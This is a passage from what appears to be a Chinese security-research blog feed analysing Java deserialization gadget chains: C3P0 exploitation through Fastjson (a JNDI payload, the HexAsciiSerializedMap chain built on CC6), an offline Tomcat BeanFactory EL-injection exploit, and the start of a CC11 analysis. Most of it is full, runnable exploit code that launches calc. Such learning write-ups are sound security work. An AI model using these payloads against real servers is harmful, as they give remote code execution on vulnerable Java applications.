<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> C3P0;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://127.0.0.1:8085/UpQiYDGn\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里反连地址我没有自己开，可以直接使用yakit工具生成jndi反连地址，最后成功执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741090441099-d6b12de5-ac36-4f5b-a6be-c84d9eb2b54b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741090441099-d6b12de5-ac36-4f5b-a6be-c84d9eb2b54b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="Mv7yR">hexbase攻击链</h3>
<h4 id="XY97U">分析</h4>

<p>hexBase攻击链能成立的原因是，存在一个<code>WrapperConnectionPoolDataSource</code>类，能它反序列化一串十六进制字符串，首部位于<code>WrapperConnectionPoolDataSource</code>类的构造函数中</p>
<p>这里使用<code>C3P0ImplUtils.parseUserOverridesAsString</code>方法，对userOverridesAsString进行了操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">WrapperConnectionPoolDataSource</span><span class="params">(<span class="type">boolean</span> autoregister)</span></span><br><span class="line">    &#123;</span><br><span class="line">	<span class="built_in">super</span>( autoregister );</span><br><span class="line"></span><br><span class="line">	setUpPropertyListeners();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//set up initial value of userOverrides</span></span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	    &#123; <span class="built_in">this</span>.userOverrides = C3P0ImplUtils.parseUserOverridesAsString( <span class="built_in">this</span>.getUserOverridesAsString() ); &#125;</span><br><span class="line">	<span class="keyword">catch</span> (Exception e)</span><br><span class="line">	    &#123;</span><br><span class="line">		<span class="keyword">if</span> ( logger.isLoggable( MLevel.WARNING ) )</span><br><span class="line">		    logger.log( MLevel.WARNING, <span class="string">&quot;Failed to parse stringified userOverrides. &quot;</span> + <span class="built_in">this</span>.getUserOverridesAsString(), e );</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//WrapperConnectionPoolDataSource#getUserOverridesAsString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title function_">getUserOverridesAsString</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">    <span class="keyword">return</span> userOverridesAsString; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入到<code>parseUserOverridesAsString</code>方法中，首先对该字符串进行了截取，然后将截取出来的部分转码后存入了serBytes字节数组中</p>
<p>执行<code>fromByteArray</code>方法时，会调用<code>deserializeFromByteArray</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HASM_HEADER</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseUserOverridesAsString</span><span class="params">( String userOverridesAsString )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123; </span><br><span class="line">	<span class="keyword">if</span> (userOverridesAsString != <span class="literal">null</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">hexAscii</span> <span class="operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);</span><br><span class="line">		<span class="type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );</span><br><span class="line">		<span class="keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );</span><br><span class="line">	    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    <span class="keyword">return</span> Collections.EMPTY_MAP;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>SerializableUtils.fromByteArray</code>方法看，里面有一个<code>derserializeFromByteArray</code>方法，继续看它干了什么</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">fromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123; </span><br><span class="line">	<span class="type">Object</span> <span class="variable">out</span> <span class="operator">=</span> deserializeFromByteArray( bytes ); </span><br><span class="line">	<span class="keyword">if</span> (out <span class="keyword">instanceof</span> IndirectlySerialized)</span><br><span class="line">	    <span class="keyword">return</span> ((IndirectlySerialized) out).getObject();</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里我们可以看出来，他将我们的字节组，都写入了一个输入流，然后对其调用了<code>readObject</code>方法，执行了反序列化的操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line">	<span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="p2yPj">EXP实现</h4>
这里的代码直接抄的 师傅的EXP（我太菜了，对于字节数组、流之间的转化，后面会补的>_<）

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> hexBase;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HexBaseFastjsonEXP</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//CC6的利用链  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">CC6</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="comment">//使用InvokeTransformer包装一下  </span></span><br><span class="line"> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;five&quot;</span>)); <span class="comment">// 防止在反序列化前弹计算器  </span></span><br><span class="line"> <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        lazyMap.remove(<span class="string">&quot;key&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 在 put 之后通过反射修改值  </span></span><br><span class="line"> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> expMap;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;  </span><br><span class="line">        sw.write(toHexDigit(h1));  </span><br><span class="line">        sw.write(toHexDigit(h2));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">char</span> out;  </span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);  </span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);  </span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);  </span></span><br><span class="line"> <span class="keyword">return</span> out;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//将类序列化为字节数组  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);  </span><br><span class="line">        oos.writeObject(o);  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//字节数组转十六进制  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;  </span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)  </span><br><span class="line">            addHexAscii(bytes[i], sw);  </span><br><span class="line">        <span class="keyword">return</span> sw.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(CC6()));  </span><br><span class="line">        System.out.println(hex);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47  </span></span><br><span class="line"> <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在低版本 FastJson 下， 也可以使用以下的的payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="g2Rbe">不出网情况下</h2>
URLClassLoader加载远程类，和JNDI注入，都需要目标机器能够出网

<p>加载HexBase字符串，可以作为一种攻击方式，但是缺又需要Fastjson等相关依赖，当目标机器不能出网，而且也没有Fastjson依赖时，C3P0该如何利用</p>
<p>在高版本JDNI利用中，我们可以通过加载本地Factory类进行攻击，利用的条件之一为该工厂类至少存在一个<code>getObjectInstance</code>方法，例如通过Tomcat8中的<code>org.apache.naming.factory.BeanFactory</code>进行EL表达式注入</p>
<h3 id="rfzl8">环境配置</h3>

<ul>
<li>JDK8u65</li>
<li>导入tomcat依赖</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">8.5</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">8.5</span><span class="number">.15</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Xg8vt">EXP实现</h3>
其他的链子有的限制太多，有的不出网，有的需要相关依赖

<p>我们这里使用URLClass的链子，EXP如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> NoNetUsing;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;  </span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;  </span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NoAccessEXP</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Loader_Ref</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);  </span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));  </span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));  </span><br><span class="line">            <span class="keyword">return</span> resourceRef;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//序列化  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(ConnectionPoolDataSource c)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;  </span><br><span class="line">        <span class="comment">//反射修改connectionPoolDataSource属性值  </span></span><br><span class="line"> <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(poolBackedDataSourceBase,c);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//序列化流写入文件  </span></span><br><span class="line"> <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);  </span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//反序列化  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);  </span><br><span class="line">        objectInputStream.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">Loader_Ref</span> <span class="variable">loader_ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader_Ref</span>();  </span><br><span class="line">        serialize(loader_ref);  </span><br><span class="line">        unserialize();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就成功弹出了计算器</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741684878895-1c6fa6c9-edc7-4365-a2f6-6a0ab3cf37a1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741684878895-1c6fa6c9-edc7-4365-a2f6-6a0ab3cf37a1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>C3P0</tag>
      </tags>
  </entry>
  <entry>
    <title>CC11链</title>
    <url>/2025/03/04/CC11%E9%93%BE/</url>
    <content><![CDATA[<h1 id="Smxco">CC11</h1>
 分析完CC1-7，继续分析一下CC11，CC11使用字节码加载，它其实是CC2+CC6的组合变形

<ul>
<li><strong>漏洞版本：cc组件3.1-3.2.1</strong></li>
</ul>
<p>这里我把CC链子的流程图放上来，实际根据CC1-7，可以衍生出来很多CCN</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741058279629-9fa7a895-47f9-4b27-bcb1-0b116b2a7980.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741058279629-9fa7a895-47f9-4b27-bcb1-0b116b2a7980.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="HscmM">CC11攻击链分析</h2>
<h3 id="Ac9wG">有数组攻击链</h3>
<h4 id="VQNKU">恶意类加载</h4>
CC2链流程

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">				...</span></span><br><span class="line"><span class="comment">					TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">						InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">							Method.invoke()</span></span><br><span class="line"><span class="comment">								Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>CC11的前半段和CC2的前半段是一样的</p>
<p>只需要调用templates的<code>newTransformer</code>方法的话，就可以实现恶意类的加载（这里的流程我们就不分析了）</p>
